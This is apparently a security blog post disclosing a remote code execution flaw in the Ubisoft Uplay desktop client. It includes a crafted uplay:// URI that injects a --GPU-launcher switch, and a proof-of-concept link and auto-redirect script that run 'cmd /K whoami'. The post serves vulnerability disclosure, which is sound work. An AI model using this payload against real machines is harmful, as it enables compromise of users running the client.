---
title: Ubisoft UPlay RCE Exploit
post: post
date: 2018-11-16 12:33
image: "/images/ubipoc.png"

---
<h1 class="cyan-text title">Ubisoft Uplay Desktop Client - Remote Code Execution</h1>
<br>
<h2 class="cyan-text subtitle">Introduction</h2>
<br>
<p class="content white-text">
Exploit Title: Ubisoft Uplay Desktop Client 63.0.5699.0 - Remote Code Execution
<br>
Date: 2018-09-01
<br>
Exploit Author: Che-Chun Kuo
<br>
Vulnerability Type: URI Parsing Command Injection
<br>
Vendor Homepage: https://www.ubisoft.com/en-us/
<br>
Software Link: https://uplay.ubi.com/
<br>
Version: 63.0.5699.0
<br>
Tested on: Windows, Microsoft Edge
<br>
Advisory: https://forums.ubi.com/showthread.php/1912340-Uplay-PC-Client-July-17th-2018
<br>
<h3 class="cyan-text subtitle">Vulnerability</h3>
<br>
The Uplay desktop client does not properly validate user-controlled data passed to its custom uplay URI protocol handler. This flaw can be used to exploit the Chromium Embedded Framework (CEF) integrated within the Uplay client, allowing for arbitrary code execution.
<br>
Installing Uplay registers the following custom uplay protocol handler: 
<pre><code class="grey darken-4 red-text">HKEY_CLASSES_ROOT
	uplay
		(Default) = "URL:uplay Protocol"
		URL Protocol = ""
			DefaultIcon
				(Default) = "upc.exe"
		Shell
			Open
			Command
				(Default) = "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\upc.exe" "%1"
</code></pre>
<br>
The %1 will be replaced with arguments from the URI. The following crafted URI performs arbitrary code execution: 
<pre><code class="grey darken-4 red-text"><!--
uplay://foobar" --GPU-launcher="cmd /K whoami &" --
-->
</code></pre>
<br>
When a victim opens this URI, the string is passed to the Windows ShellExecute function.
<br>
Microsoft states the following: "When ShellExecute executes the pluggable protocol handler with a string on the command line, any non-encoded spaces, quotes, and backslashes in the URI will be interpreted as part of the command line. This means that if you use C/C++â€™s argc and argv to determine the arguments passed to your application, the string may be broken across multiple parameters."
<br>
"Malicious parties could use additional quote or backslash characters to pass additional command line parameters. For this reason, pluggable protocol handlers should assume that any parameters on the command line could come from malicious parties, and carefully validate them."
<br>
The Uplay desktop client does not properly validate user-controlled data. An attacker can inject certain Chromium flags that allow for arbitrary code execution. The malicious URI breaks the command line with a quote character and inserts a new switch called --GPU-launcher. Since the Uplay client uses the Chromium Embedded Framework (CEF), Chromium command lines switches are supported.
<br>
The --GPU-launcher switch provides a method to execute arbitrary commands. The following string shows the final command, which opens the Windows command prompt and executes the whoami program. 
<br>
<pre><code class="grey darken-4 red-text">"C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\upc.exe" "foobar" --GPU-launcher="cmd /K whoami &" --"</code></pre>
<br>
<h3 class="cyan-text subtitle">Attack Scenario</h3>
<br>
The following attack scenario would result in the compromise of a victim's machine with the vulnerable Uplay client installed. A user running Microsoft Edge visits a specially crafted webpage or clicks on a specially crafted link. The user is served with the prompt: Did you mean to switch apps? Microsoft Edge is trying to open "UPlay launcher". After the user gives consent, the vulnerable application runs, resulting in arbitrary code execution in the context of the current process.
<br> 
This scenario also works on IE, but the IE browser shows the URI string to be opened and warns users against opening untrusted content. Microsoft Edge provides no such warning. Chrome and Firefox both escape illegal characters before passing the URI to the protocol handler.
<br> 
After Uplay desktop client (upc.exe) is run, upc.exe will attempt to open additional executables before the --GPU-launcher is activated. One notable executable is the UplayService.exe. UplayService requires elevated privileges. If the user is a non-administrative user a UAC prompt will appear. 
<br>
It should be noted, this UAC prompt doesn't prevent command execution from occurring. Regardless of which option the user chooses within the UplayService UAC prompt (Yes/No), command execution will still occur once the code that passes the --GPU-launcher switch to the CEF is triggered within upc.exe. 
<br>
<h4 class="cyan-text subtitle">Proof of Concept</h4>
<br>
The following POC provides two avenues to trigger the vulnerability within Microsoft Edge. 
The first method triggers when the webpage is opened. 
The second method triggers when the hyperlink is clicked by a user.
<br>
<pre><code class="grey darken-4 red-text"><!--
<a href='uplay://foobar" --GPU-launcher="cmd /K whoami &" --'>ubisoft uplay desktop client rce poc</a>

<script>
  window.location = 'uplay://foobar" --GPU-launcher="cmd /K whoami &" --'
</script> -->
</code></pre>
<br>
<div class="video-container">
  <iframe src="https://www.youtube.com/embed/mffRsZgWgys" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 </div>